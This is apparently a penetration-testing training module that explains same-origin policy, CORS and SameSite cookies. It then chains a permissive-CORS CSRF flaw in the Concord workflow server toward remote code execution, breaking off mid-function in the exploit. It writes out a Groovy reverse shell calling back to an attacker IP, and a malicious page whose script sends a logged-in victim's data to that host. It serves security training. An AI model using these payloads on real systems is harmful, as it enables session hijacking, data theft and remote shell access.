##### Concord Authentication Bypass to RCE

In this module, we will target the open-source Concord workflow server, which was developed by WalMart. As we will discover, Concord suffers from three authentication bypass vulnerabilities. The first vulnerability was discovered by Rob Fitzpatrick, who discovered an information disclosure vulnerability associated with a permissive Cross-Origin Resources Sharing (CORS) header. The second vulnerability is a Cross-site Request Forgery (CSRF) vulnerability that was discovered by Offensive Security. The third vulnerability (also discovered by Offensive Security) leverages default user accounts that can be accessed with undocumented API keys.

We will review all three vulnerabilities in this module, beginning with the CORS vulnerability. We'll start with a greybox approach in which we have access to the documentation, but we won't review the source code. As we search for a viable exploit vector, we will uncover the CSRF and leverage these vulnerabilities into remote code execution (RCE).

Finally, we will review the source code (adopting a whitebox approach) to uncover the default user vulnerability, which we will again leverage into RCE.

1
(Atlassian, 2021), https://www.atlassian.com/continuous-delivery/continuous-deployment ↩︎



The Concord application is running on port 8001. Let's navigate to the page with Burp Suite's embedded Chromium browser.

Figure 1: Concord Home Page
Figure 1: Concord Home Page
The home page immediately prompts for a username and password. Other than the Login button, there are no other obvious links on this page. Let's attempt to discover additional routes and files with a default dirb scan.

kali@kali:~$ dirb http://concord:8001

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Apr  1 16:15:44 2021
URL_BASE: http://concord:8001/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://concord:8001/ ----
+ http://concord:8001/api (CODE:401|SIZE:0)
==> DIRECTORY: http://concord:8001/docs/
+ http://concord:8001/forms (CODE:401|SIZE:0)
==> DIRECTORY: http://concord:8001/images/
+ http://concord:8001/index.html (CODE:200|SIZE:2166)
+ http://concord:8001/logs (CODE:401|SIZE:0)
==> DIRECTORY: http://concord:8001/static/

---- Entering directory: http://concord:8001/docs/ ----
+ http://concord:8001/docs/index.html (CODE:200|SIZE:3589)

---- Entering directory: http://concord:8001/images/ ----

---- Entering directory: http://concord:8001/static/ ----
==> DIRECTORY: http://concord:8001/static/css/
==> DIRECTORY: http://concord:8001/static/js/
==> DIRECTORY: http://concord:8001/static/media/

---- Entering directory: http://concord:8001/static/css/ ----

---- Entering directory: http://concord:8001/static/js/ ----

---- Entering directory: http://concord:8001/static/media/ ----

-----------------
END_TIME: Thu Apr  1 16:56:42 2021
DOWNLOADED: 32284 - FOUND: 5
Listing 1 - Dirb Output

All discovered routes except for the root of the page and the static resources (css, js, and media) return an Unauthorized message (401). Applications like this typically present a very small footprint to unauthorized users. Let's review the HTTP history tab in Burp Suite to gain a better understanding of the application.

Figure 2: Burp History - Initial Navigation
Figure 2: Burp History - Initial Navigation
The initial page load initiated eight requests. The request to cfg.js loads configurations that point to the Concord documentation and the GitHub repository. The requests to static/js load the client-side JavaScript. The requests to images load the logo, and the request to static/media loads the font. All of this is fairly standard. However, the /api/service/console/whoami API request (which returned an unauthorized response) is interesting. Let's investigate further.

Figure 3: Request to /api/service/console/whoami
Figure 3: Request to /api/service/console/whoami
Based on the route name, we can assume that this request would return information about the authenticated user. Since we are not authenticated, the response contains no user data. However, the headers that begin with "Access-Control" are interesting. These headers instruct the browser to grant specific origins access to specific resources. The mechanism that controls this is specified in the Cross-Origin Resource Sharing (CORS) standard.2

Let's discuss this potential attack vector.

1
(Walmart, 2021), https://concord.walmartlabs.com/docs/index.html ↩︎

2
(WHATWG, 2021), https://fetch.spec.whatwg.org/#http-cors-protocol ↩︎

8.2. Authentication Bypass: Round One - CSRF and CORS
When we discover a target application that serves CORS headers, we should investigate them since overly-permissive headers could create a vulnerability. For example, we could create a payload on a malicious website that could force a visitor to request data from the vulnerable website. If the victim is authenticated to the target site, our malicious site could steal the user's data from the target site or run malicious requests (depending on the actual CORS settings). This is possible since by default, most browsers are configured to send cookies (including session cookies) with requests to the target site.

By default, most browsers attempt to protect the user from such an attack in several ways. Nevertheless, a misconfigured site can relax these protections, making the site vulnerable to such an attack.

This attack is considered a form of Cross-Site Request Forgery (CSRF)1 or session riding. During a CSRF attack, an attacker runs certain actions on the victim's behalf. If the victim is authenticated, those actions will also be authenticated. CSRF attacks are not new. However, when paired with overly-permissive CORS settings, we have greater flexibility in the types of requests we can send and the types of data we can obtain.

In order to properly describe CORS and CSRF attacks, we must first discuss the browser's protection mechanisms.

Unlike other headers that can increase the security of an application, CORS headers reduce the application's security, relaxing the Same-origin Policy (SOP),2 which prevents cross-site communication. Let's investigate this further.

1
(Wikipedia, 2021), https://en.wikipedia.org/wiki/Cross-site_request_forgery ↩︎

2
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy ↩︎

8.2.1. Same-Origin Policy (SOP)
Browsers enforce a same-origin policy to prevent one origin from accessing resources on a different origin. An origin is defined as a protocol, hostname, and port number. A resource can be an image, html, data, json, etc.

Without the same-origin policy, the web would be a much more dangerous place, allowing any website we visit to read our emails, check our bank balances, and view other information even from our logged-in sessions.

Consider an example in which https://a.com/latest reaches out to multiple resources to load the page. Some resources might be on the same domain, but on a different page. Others might be on a completely different domain. Not all of these resources will successfully load.

This table lists some of those resources, indicates whether or not they will load, and explains why:

URL	Result	Reason
https://a.com/myInfo	Allowed	Same Origin
http://a.com/users.json	Blocked	Different Scheme and Port
https://api.a.com/info	Blocked	Different Domain
https://a.com**:8443**/files	Blocked	Different Port
https://b.com/analytics	Blocked	Different Domain
Table 2 - Investigating SOP

This might seem confusing since plenty of websites have images, scripts, and other resources loaded from third-party origins. However, the purpose of SOP is not to prevent the request for a resource from being sent, but to prevent JavaScript from reading the response.1 In the example listed in Table 2, all of the requests would be sent, but the JavaScript on https://a.com/latest would not be able to read the response of those marked as "Blocked".

Images, iFrames, and other resources are allowed because while SOP doesn't allow the JavaScript engine to access the contents of a response it does allow the resource to be loaded onto the page.

This is functionally similar to the HttpOnly cookie flag, which prevents JavaScript from accessing the cookie, but allows the browser to send it with HTTP requests.

Let's use the Concord page and the Chromium JavaScript console to demonstrate this. First we'll send a request to a resource on the same origin using the configuration file we found earlier at cfg.js. We'll use fetch2 to send an HTTP GET request and then read the response. The command we'll use is listed below.

fetch("http://concord:8001/cfg.js")
	.then(function (response) {
		return response.text();
	})
	.then(function (text) {
		console.log(text);
	})
Listing 2 - Using Fetch to Send Request - cjg.js

To run this, we'll open the Developer Console in Chromium by pressing C+B+I and navigating to the Console tab.

Figure 4: Fetch to cfgj.s
Figure 4: Fetch to cfgj.s
This request was successful and JavaScript can read the response as shown in the console log.

Next, let's try to access a resource on another origin using this request:

fetch("http://example.com")
   .then(function (response) {
   	return response.text();
   })
   .then(function (text) {
   	console.log(text);
   })
Listing 3 - Using Fetch to Send Request - example.com

We'll again use the Console to send this request.

Figure 5: Fetch to example.com
Figure 5: Fetch to example.com
This time, the console throws an error indicating that the request was blocked. However, we can find the request and the response in Burp Suite.

Figure 6: Example.com Request and Response
Figure 6: Example.com Request and Response
The response contains the content, but the browser prevented us (and JavaScript) from accessing the data.

Given this information, it's natural for our hacker brains to think we can bypass SOP by just adding an image to our site, setting the src to be the GET request we want to send, and reading the contents of the image. For example, let's say we want to access an authenticated user's email. We might add an image on a site we control with the url http://email.com/latestMessage. When the browser loads the page, it will send a request to "http://email.com/latestMessage", load the user's latest email, and place the contents in an "image". Of course this image won't be valid, since it will contain the contents of the email, but we should be able to read the contents of the image with JavaScript right? Wrong. Since the "image" was loaded from a different origin, the SOP will block JavaScript from accessing the contents. 3

There are legitimate reasons a developer might want access to resources on a different origin. For example, a single page application4 (https://a.com) might want to access data via an API (https://api.a.com). To do this, the Cross-origin resource sharing (CORS) specification was introduced to allow developers to relax the same-origin policies.

1
(Wikipedia, 2021), https://en.wikipedia.org/wiki/Same-origin_policy ↩︎

2
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API ↩︎

3
(PortSwigger, 2021), https://portswigger.net/web-security/cors/same-origin-policy ↩︎

4
(Wikipedia, 2021), https://en.wikipedia.org/wiki/Single-page_application ↩︎

8.2.2. Cross-Origin Resource Sharing (CORS)
In its simplest terms, CORS instructs a browser, via headers, which origins are allowed to access resources from the server. For example, to allow https://a.com to load data from https://api.a.com, the API endpoint must have a CORS header allowing the https://a.com origin.

Let's review these headers in an example HTTP response:

HTTP/1.1 200 OK
Cache-Control: no-cache
Access-Control-Allow-Origin: https://a.com
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: cache-control,content-language,expires,last-modified,content-range,content-length,accept-ranges
Cache-Control: no-cache
Content-Type: application/json
Vary: Accept-Encoding
Connection: close
Content-Length: 15

{"status":"ok"}
Listing 4 - Example HTTP Request

The CORS headers start with "Access-Control". While not all of them are necessary for cross-origin communication, this example displays some common CORS headers.1 Let's review each of these:

Access-Control-Allow-Origin: Describes which origins can access the response.
Access-Control-Allow-Credentials: Indicates if the request can include credentials (cookies)
Access-Control-Expose-Headers: Instructs the browser to expose certain headers to JavaScript
The most important of these headers is the Access-Control-Allow-Origin (Listing 4), which specifies that the origin at https://a.com can access the resources on this host.

As we've discussed, SOP does not prevent the request from being sent, but instead prevents the response from being read. However, there are exceptions. Some requests require an HTTP preflight request2 (sent with the OPTIONS method), which determines if the subsequent browser request should be allowed to be sent. Standard GET, HEAD, and POST requests don't require preflight requests. However, other request methods, requests with custom HTTP headers, or POST requests with nonstandard content-types will require a preflight request.

Let's again use the JavaScript console to demonstrate this. All requests will be proxied through Burp Suite.

First, we'll start with a POST request using a standard Content-Type header. We'll send the request to example.com, not bothering to log the response.

fetch("https://example.com",
   {
   	method: 'post',
   	headers: {
   		"Content-type": "application/x-www-form-urlencoded;"
   	}
   })
Listing 5 - Using Fetch to Send a POST Request - example.com

Once again, we'll run this command in the Developer Console.

Figure 7: POST Request with Standard Content Type
Figure 7: POST Request with Standard Content Type
As expected, this response was blocked by the SOP but if we review the request in Burp Suite, we find that the POST request was actually sent.

Figure 8: POST Request with Standard Content Type in Burp
Figure 8: POST Request with Standard Content Type in Burp
Next, let's change the content type to a non-standard value, which is anything that is not "application/x-www-form-urlencoded", "multipart/form-data", or "text/plain".

fetch("https://example.com",
   {
   	method: 'post',
   	headers: {
   		"Content-type": "application/json;"
   	}
   })
Listing 6 - Using Fetch to Send a POST Request - example.com with custom Content-type

Let's execute this command in the Console.

Figure 9: POST Request with Non-Standard Content Type
Figure 9: POST Request with Non-Standard Content Type
Again, the request was blocked. However, if we inspect the request, we find that it was not a POST.

Figure 10: OPTIONS Request with Non-Standard Content Type in Burp
Figure 10: OPTIONS Request with Non-Standard Content Type in Burp
This request is the preflight OPTIONS request. In this request the client (the browser) is attempting to send a POST request with a custom content-type header. Since the server did not respond with CORS headers, the SOP blocked the request.

Now, let's send a request to a site that has the CORS headers set. For this, we'll use test-cors.appspot.com, a site designed to test CORS headers.

fetch("https://cors-test.appspot.com/test",
   {
   	method: 'post',
   	headers: {
   		"Content-type": "application/json;"
   	}
   })
Listing 7 - Using Fetch to Send a POST Request - cors-test.appspot.com with custom Content-type

We'll paste this command into the Developer Console to execute it.

Figure 9: POST Request with Non-Standard Content Type With CORS Response
Figure 9: POST Request with Non-Standard Content Type With CORS Response
This time, the command didn't throw an error. Let's investigate the HTTP request that was sent.

Figure 10: OPTION Request with Non-Standard Content Type in Burp With CORS Response
Figure 10: OPTION Request with Non-Standard Content Type in Burp With CORS Response
Again, the initial request was an OPTIONS request, which indicated that we are attempting to send a POST request with a custom content-type header. This time the response contained several CORS headers which allows our origin, allows our custom header, allows a POST request, instructs our browser to cache the CORS configuration for 0 seconds, and allows credentials (cookies).

Following this preflight request, we find the actual POST request we were attempting to send.

Figure 11: POST Request with Non-Standard Content Type in Burp With CORS Response
Figure 11: POST Request with Non-Standard Content Type in Burp With CORS Response
This time the actual POST request was sent through with the custom Content-Type.

It's important that we understand these concepts so we know what kind of requests will actually send data and which won't. Our specific situation will often dictate our needs. For example, if we need to send requests but don't care about receiving responses (exfiltration, etc), we have many options. However, if we require responses, or intend to gather data or resources from the target, we have fewer options since the target must send more permissive headers.

From a security perspective, the most important headers when analyzing target applications for CORS vulnerabilities are Access-Control-Allow-Origin and Access-Control-Allow-Credentials. Access-Control-Allow-Credentials only accepts a "true" value with the default being "false". If this header is set to true, any request sent will include the cookies set by the site. This means that the browser will automatically authenticate the request.

The only origins allowed to read a resource are those listed in Access-Control-Allow-Origin. This header can be set to three values: "*", an origin, or "null". If the header is set to a wildcard ("*"), all origins are allowed to read a resource from the remote server. This might seem like the vulnerable configuration we are looking for, but this setting requires that Access-Control-Allow-Credentials is set to false, which results in all requests being unauthenticated. If the header is set to an origin value, only that origin is allowed to read the resource and, if Access-Control-Allow-Credentials is set to true, include the cookies.

The "null" value may seem like the secure option, but it is not. Certain documents and files opened in the browser have a "null" origin. If the goal is to block other origins from sending requests to the target, removing the header is the most secure option. In fact, we could abuse the technique shown in this module to exploit a "null" value in this header. For the purposes of this module, we will not be analyzing the "null" origin.

In secure circumstances, the Access-Control-Allow-Origin would only be set to trusted origins. This means that a malicious site we control would not be able to make HTTP requests on behalf of a user and read the response.

Unfortunately, Access-Control-Allow-Origin only lets sites set a single origin. The header cannot contain wildcards (*.a.com) or lists (a.com, b.com, c.com). For this reason, developers found a creative (and insecure) solution. By dynamically setting the Access-Control-Allow-Origin header to the origin of the request, multiple origins can send requests with Cookies.

We can witness this in the https://cors-test.appspot.com/test site that we interacted with earlier:

Figure 12: OPTION Request with ORIGIN Header
Figure 12: OPTION Request with ORIGIN Header
The value in the Origin header is set to the origin in the browser (http://concord:8001). This header is automatically set by the browser for all CORS requests sent by JavaScript.3 The response contains this origin in the Access-Control-Allow-Origin header and allows for cookies to be sent with the request. This is the mechanism that instructs the CORS test site to allow requests (with cookies) from any origin. However, this is only useful if the target hosts sensitive data worth stealing or an API we could maliciously interact with. Unfortunately, our test site has neither.

Let's go back to the Concord application and analyze the request we found earlier.



1
(Mozilla, 2021), https://developer.mozilla3.org/en-US/docs/Web/HTTP/Headers#cors ↩︎

2
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Glossary/Preflight_request ↩︎

3
(WHATWG, 2021), https://fetch.spec.whatwg.org/#cors-request ↩︎


##### Discovering Unsafe CORS Headers
Returning to the Concord application, let's send the /api/service/console/whoami request to the repeater by right-clicking the request and selecting Send to Repeater. Once in Repeater, we'll send the original request to review the response.

Figure 13: Concord whoami Request
Figure 13: Concord whoami Request
This GET request to /api/service/console/whoami does not contain an Origin header. This is because the request is a GET to the same origin, meaning it is not a CORS request. The response contains an "Access-Control-Allow-Origin: *" header. As we've discussed, this indicates that the browser won't send the cookies on cross-origin requests.

If the application requires authentication, there must be some form of session management. If there is session management, there must be some way to send the session identifier with the request.

Let's try to add an Origin header to the request and analyze the response.

Figure 14: Concord whoami Request With Origin
Figure 14: Concord whoami Request With Origin
Not only did the server replicate the origin into the Access-Control-Allow-Origin header, but it also added the Access-Control-Allow-Credentials header, setting it to true.

However, every endpoint and HTTP method can have different CORS headers depending on the actions that are allowed or disallowed. Since we know that all non-standard GET and POST requests will send an OPTIONS request first to check if it can send the subsequent request, let's change the method to OPTIONS and review the response.

Figure 15: Concord OPTIONS Request With Origin
Figure 15: Concord OPTIONS Request With Origin
When an OPTIONS request is sent, the Origin header is not replicated to the Access-Control-Allow-Origin header. Unfortunately, this means that the CORS vulnerability is limited. We will only be able to read the response of GET requests and standard POST requests.

In order to understand what we can and cannot do with this information, we should investigate one more control that could prevent a browser from sending a cookie: the SameSite1 attribute.

1
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite ↩︎

8.2.4. SameSite Attribute
As we've already discussed, it is not difficult to instruct the user's browser to send the request. It is more difficult to instruct the browser to send the request with the session cookies and gain access to the response. To understand the mechanics of cookies in this context, we must discuss the optional SameSite attribute of the Set-Cookie HTTP header.

Let's inspect an HTTP response to understand where we might find the SameSite attribute.

HTTP/1.1 200 OK
Connection: close
Date: Thu, 01 Apr 2021 20:53:24 GMT
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Expires: 0
Content-Type: application/javascript
Set-Cookie: session=ABCDEFGHIJKLMNO; Path=/; Max-Age=0; SameSite=Lax;
Content-Length: 316

Listing 8 - Example HTTP Response with SetCookie

The attribute can be found anywhere in the Set-Cookie header. The attributes are separated by semicolons.

This attribute defines whether or not cookies are restricted to a same-site context. There are three possible values for this attribute: Strict, None, and Lax.

If SameSite is set to Strict on a cookie, the browser will only send those cookies when the user is on the corresponding website. For example, let's imagine a site with the domain funnycatpictures.com, which displays unique cat pictures to each user. The site uses cookies to track each user's cats. If their cookies are set with the SameSite=Strict attribute, those cookies would be sent when the user visits funnycatpictures.com but would not be sent if a cat picture is embedded in a different site. In addition, Strict also prevents the cookies from being sent on navigation actions (i.e. clicking a link to funnycatpictures.com) or within loaded iframes.

When SameSite is set to None, cookies will be sent in all contexts: when navigating, when loading images, and when loading iframes. The None value requires the Secure attribute,1 which ensures the cookie is only sent via HTTPS.

Finally, the Lax value instructs that the cookies will be sent on some requests across different sites. For a cookie to be included in a request, it must meet both of the following requirements:

It must use a method that does not facilitate a change on the server (GET, HEAD, OPTIONS).2
It must originate from user-initiated navigation (also known as top-level navigation), for example, clicking a link will include the cookie, but requests made by images or scripts will not.
SameSite is a relatively new browser feature and is not widely used. If a site does not set the SameSite attribute, the default implementation varies based on the type and version of the browser.

As of Chrome Version 80 and Edge Version 86, Lax is the default setting for cookies that do not have the SameSite attribute set. At the time of this writing, Firefox and Safari have set the default to None. As with most other browser security features, Internet Explorer does not support SameSite at all.

Back to our scenario, we should search for this attribute in the cookies sent by Concord but we haven't yet received any. In many cases, an application might only set a cookie when a user is authenticated or when they are attempting to authenticate. Let's attempt to log in, find the request in Burp Suite, and observe the response.

Figure 16: Login Request and Response
Figure 16: Login Request and Response
When we submit a login request, the "whoami" request is also sent, but this time with the username and password Base64-encoded in the authorization header. The response contains a cookie. This is most likely not the session cookie but it does not have the SameSite attribute set.

With the existence of the login page and the Access-Control-Allow-Credentials header, we can assume that cookies are being used for session management. Considering that roughly only 10% of cookies contain a SameSite attribute,3 we will assume that Concord does not set this attribute.

Depending on what browser a user is using, the default fallback value might be None or Lax.

When the default value in a browser is None, the user visiting that page might be vulnerable to CSRF. As we discussed earlier, when SameSite is set to None the browser will send the cookie in all contexts (image loads, navigation, etc.). In this situation, one site can send a request to another domain and the browser will include cookies, making CSRF possible if the victim web application does not implement any additional safeguards.

Developers also have the option of mitigating CSRF vulnerabilities with the use of a CSRF token4 which must be sent with a request that processes a state change. The CSRF token would indicate that a user loaded a page and submitted the request themselves. Often times, CSRF tokens are incorrectly configured, reused, or not rotated frequently enough. In addition, if the site is vulnerable to permissive CORS headers, we would be able to extract a CSRF token by requesting it from the page that would embed it.

Understanding the relationship between SOP, CORS, and the SameSite attribute is critical in understanding how and when an application might be vulnerable to CSRF.

In our scenario, we have learned that the Concord target has some permissive CORS headers. We have also not discovered any CSRF tokens. Combining this information with the state of SameSite, we suspect that we might be able to exploit a CSRF vulnerability. To execute CSRF, we must have a target user and an endpoint that allows us to extract valuable information or perform a privileged action.

We'll investigate the Concord documentation in order to determine what we can and cannot do with the information we have so far.

1
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#attributes ↩︎

2
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Glossary/Safe/HTTP ↩︎

3
(Calvano, 2020), https://dev.to/httparchive/samesite-cookies-are-you-ready-5abd ↩︎

4
(OWASP, 2021), https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#token-based-mitigation ↩︎

##### Exploit Permissive CORS and CSRF
Now that we have discussed the relationship between the various mitigating factors and have found that CORS headers are enabled and permissive, we can focus on exploitation. CORS exploits are similar to reflected Cross-Site Scripting (XSS) in that we must send a link to an already-authenticated user in order to exploit something of value. The difference with CORS is that the link we send will not be on the same domain as the site we are targeting. Since Concord has some permissive CORS headers, any site that an authenticated user visits can interact with Concord and ride the user's session. As we discovered earlier, only GET requests and some POST requests will work in Concord.

To exploit CORS, we must host our own site for the user to visit. Our site will host a JavaScript payload that will run in the victim's browser and interact with Concord. In the real world, we might host a Concord blog with relevant Concord information to entice a victim to visit our site.

Before we create the site, we must first find a payload that will allow us to elevate privileges or obtain sensitive information. Since we don't have the ability to log in to the Concord application and review its functionality, we will need to use the documentation.

Fortunately for us, the Concord API documentation1 is fairly extensive. Since CORS headers are often enabled to allow for browsers to communicate with the API, this is a great place to start our research.

Because Concord has placed some restrictions on the CORS header, we must be selective in the types of requests we are searching for. When we review the documentation, we'll search for a GET request that allows us to obtain sensitive information (like secrets or API keys), a GET request that changes the state of the application, or a POST request that only uses standard content-types.

The first section that catches our attention pertains to the "API Key".2 This section describes an endpoint that "Creates a new API key for a user."

Figure 17: Create API Key Documentation
Figure 17: Create API Key Documentation
The request is sent with a POST request using the application/json content type. Unfortunately, this won't work as the browser will send an OPTIONS request before the POST request. As we've learned earlier, the responses to OPTIONS requests in Concord contain different CORS headers that are less vulnerable. Let's keep searching.

The next endpoint, labeled "List Existing API keys", seems a bit more promising.

Figure 18: List API Key Documentation
Figure 18: List API Key Documentation
This is a GET request that shouldn't need an OPTIONS request. Closer examination reveals that this API "only returns metadata, not actual keys." While we know we can send this request and access the response, we won't be able to obtain anything that gets us more access than we currently have.

Further review of the API documentation reveals that the GET requests only provide us with information disclosure, and may not improve our level of access. However, we eventually discover an interesting section under "process", which states:

A process is an execution of a flow in repository of a project.

If we can start a process, we might be able to execute commands. Let's review what type of request is required.

Figure 19: Start a Process Documentation
Figure 19: Start a Process Documentation
This request requires the use of a POST method with the content-type of "multipart/form-data". According to Mozilla, a "multipart/form-data" content type does not require a preflight check.3 The Concord documentation also states that we can use the Authorization header. The authentication documentation indicates that the Authorization header can be used for API keys 4 in curl requests. This header was also used in the login request.

While a site could authenticate requests solely with an Authorization header, most modern graphical sites coded for browser-based clients use cookies for authentication. This is a safe assumption since Concord accepts multiple forms of authentication, and the browser must authenticate the API calls in some way. In addition, since the server sent the Access-Control-Allow-Credentials header, we can assume that cookies are used for session management.

Let's continue our review of the process API call to determine what else we may need in order to exploit Concord.

Further down in the documentation we discover text describing how to start a Concord process by uploading a ZIP file:

Figure 20: ZIP File Documentation
Figure 20: ZIP File Documentation
The documentation explains how we can create a zip archive with a concord.yml file that contains a "flow". We'll review the documentation for flows later, but for now let's review the example curl request.

This curl command sends a GET request to /api/v1/process and specifies the ZIP with the -F flag. Let's get more information about this flag from the curl help output.

kali@kali:~$ curl --help all
Usage: curl [options...] <url>
     --abstract-unix-socket <path> Connect via abstract Unix domain socket
     --alt-svc <file name> Enable alt-svc with this cache file
     --anyauth       Pick any authentication method
 -a, --append        Append to target file when uploading
...
 -F, --form <name=content> Specify multipart MIME data
     --form-string <name=string> Specify multipart MIME data
 ...
Listing 9 - curl Help

According to curl, the -F flag specifies multipart data.

Based on this, we conclude that we can start a process by sending a request to /api/v1/process with a ZIP file named "archive" containing a concord.yml file.

If we dig deeper into the documentation, we discover that we don't even need to provide a ZIP file, only a concord.yml file.

Figure 21: Start Process with Only concord.yml
Figure 21: Start Process with Only concord.yml
Next, let's review the process documentation to search for potential paths to code execution.

The "Directory Structure" section5 defines the concord.yml file:

concord.yml: a Concord DSL file containing the main flow, configuration, profiles and other declarations;

In Concord, a DSL file defines various configurations, flows, and profiles.6 Earlier, the documentation mentioned that the uploaded file must contain a flow. Let's review the documentation pertaining to a flow:

Figure 22: Flow Documentations
Figure 22: Flow Documentations
Concord describes a flow as a "series of steps executing various actions". This seems to be a perfect command execution vector. Let's determine how we can get Concord to execute system commands.

We can find examples of flows that execute code in the "Scripting" section of the documentation.7 We'll use the Groovy example to build our payload.

Figure 23: Groovy Documentation
Figure 23: Groovy Documentation
The documentation indicates that we must first import the groovy dependency:

configuration:
  dependencies:
  - "mvn://org.codehaus.groovy:groovy-all:pom:2.5.2"

Listing 10 - Building Groovy Payload - Dependency

Next, since the documentation states we must provide at least one flow, we'll set the script variable to "groovy" (as shown in the example) to instruct concord to execute the command as groovy.

configuration:
  dependencies:
  - "mvn://org.codehaus.groovy:groovy-all:pom:2.5.2"
flows:
  default:
    - script: groovy
Listing 11 - Building Groovy Payload - flow

Once that is set up, we need to add a body with a script. We'll use a YML HereDoc8 for this so we don't have to write a one-liner. We'll use a common groovy reverse shell as our script and format it for readability.9

configuration:
  dependencies:
  - "mvn://org.codehaus.groovy:groovy-all:pom:2.5.2"
flows:
  default:
    - script: groovy
      body: |
         String host = "192.168.118.2";
         int port = 9000;
         String cmd = "/bin/sh";
         Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
         Socket s = new Socket(host, port);
         InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
         OutputStream po = p.getOutputStream(), so = s.getOutputStream();
         while (!s.isClosed()) {
         while (pi.available() > 0) so.write(pi.read());
         while (pe.available() > 0) so.write(pe.read());
         while (si.available() > 0) po.write(si.read());
         so.flush();
         po.flush();
         Thread.sleep(50);
         try {
            p.exitValue();
            break;
         } catch (Exception e) {}
         };
         p.destroy();
         s.close();
Listing 12 - Building Groovy Payload - Reverse Shell

This will become the concord.yml file that we will send to the server. We'll save this payload for later. Next, we need to create the delivery mechanism. As mentioned earlier, we will create a website that will send this payload. We'll start with an empty HTML page that contains a single script tag.

<html>
	<head>
		<script>
		</script>
	</head>
	<body>
	</body>
</html>
Listing 13 - Basic HTML Page

Next, we need to add some JavaScript between the script tags that will send the API call to deliver the concord.yml payload. Before we do that, we'll send the "whoami" request to determine if the user is actually logged in. This isn't strictly necessary but it will make the exploit more effective, less noisy, and will provide us with more usable data.

<script>
	fetch("http://concord:8001/api/service/console/whoami", {
		credentials: 'include'
	})
	.then(async (response) => {
		if(response.status != 401){
			let data = await response.text();
			fetch("http://192.168.118.2/?msg=" + data )
		}else{
			fetch("http://192.168.118.2/?msg=UserNotLoggedIn" )
		}
	})
</script>
Listing 14 - Using Fetch to Call whoami

The code in Listing 14 will first send a request to the target server and the target endpoint with the credentials (cookies). If the response status is not 401, the captured data will be sent back. If the response status is 401, a message will be sent back to our Kali server.

Let's save the contents of this into ~/concord/index.html and use Python to start an HTTP server on port 80.

kali@kali:~$ mkdir concord

kali@kali:~$ cd concord/

kali@kali:~/concord$ mousepad index.html

kali@kali:~/concord$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
Listing 15 - Serving HTML with whoami Request

Next, we'll visit this page in Firefox to validate that it is working. Since we are not logged into Concord, we should expect to hit the else branch and return a "UserNotLoggedIn" message.

Figure 24: Visiting Page in Firefox
Figure 24: Visiting Page in Firefox
When we check the Python HTTP server logs, we find that we indeed received a "UserNotLoggedIn" message.

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.118.2 - - [07/Apr/2021 19:35:30] "GET / HTTP/1.1" 200 -
192.168.118.2 - - [07/Apr/2021 19:35:30] code 404, message File not found
192.168.118.2 - - [07/Apr/2021 19:35:30] "GET /favicon.ico HTTP/1.1" 404 -
192.168.118.2 - - [07/Apr/2021 19:35:30] "GET /?msg=UserNotLoggedIn HTTP/1.1" 200 -
Listing 16 - UserNotLoggedIn in Logs

Using the provided Kali debugger VM, we have access to a user activity simulator that will visit any page we provide. The simulator includes a user authenticated to Concord. If we didn't start the debugger VM earlier, we'll need to start it now on the Labs page. We'll use this simulator to test our current payload to verify that it is working.

To connect, we'll RDP to the Kali debugger and visit http://simulator. We'll enter our Kali IP and click Simulate.

Once the simulation is complete, we'll again check our HTTP server logs.

192.168.121.253 - - [07/Apr/2021 19:48:44] "GET / HTTP/1.1" 200 -
192.168.121.253 - - [07/Apr/2021 19:48:45] "GET /?msg={%20%20%22realm%22%20:%20%22apikey%22,%20%20%22username%22%20:%20%22concordAgent%22,%20%20%22displayName%22%20:%20%22concordAgent%22} HTTP/1.1" 200 -
Listing 17 - Logged In User Executing Payload

As expected, the CORS payload worked. When an authenticated user visited the page, our malicious site was able to send a request to Concord and include the user's credentials. Let's decode the message to understand what kind of information we were able to obtain.

{
	"realm": "apikey",
	"username": "concordAgent",
	"displayName": "concordAgent"
}
Listing 18 - Decoded Message

We seem to have phished the concordAgent user. Next, let's attempt to reach code execution by sending the concord.yml file we created earlier. We'll start by defining the YAML at the beginning of the script tags in the HTML file. We'll use a string template to make the payload easier to edit if we need to. It's important to note that YAML is very sensitive to whitespace, so we cannot use additional tabs to make this document format easier to read.

   <script>
        yml = `
configuration:
  dependencies:
    - "mvn://org.codehaus.groovy:groovy-all:pom:2.5.8"

flows:
  default:
    - script: groovy
      body: |
         String host = "192.168.118.2";
         int port = 9000;
         String cmd = "/bin/sh";
         Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
         Socket s = new Socket(host, port);
         InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
         OutputStream po = p.getOutputStream(), so = s.getOutputStream();
         while (!s.isClosed()) {
         while (pi.available() > 0) so.write(pi.read());
         while (pe.available() > 0) so.write(pe.read());
         while (si.available() > 0) po.write(si.read());
         so.flush();
         po.flush();
         Thread.sleep(50);
         try {
            p.exitValue();
            break;
         } catch (Exception e) {}
         };
         p.destroy();
         s.close();
`

      fetch("http://concord:8001/api/service/console/whoami", {
         credentials: 'include'
      })
...
   </script>
Listing 19 - Adding Yaml to HTML

Next, we will define a function at the end of the script tags that will post the concord.yml file.

function rce() {
   var ymlBlob = new Blob([yml], { type: "application/yml" });
   var fd = new FormData();
   fd.append('concord.yml', ymlBlob);
   fetch("http://concord:8001/api/v1/process", {
      // FIXME
      body: fd
   })
   .then(response => response.text())
   .then(data => {
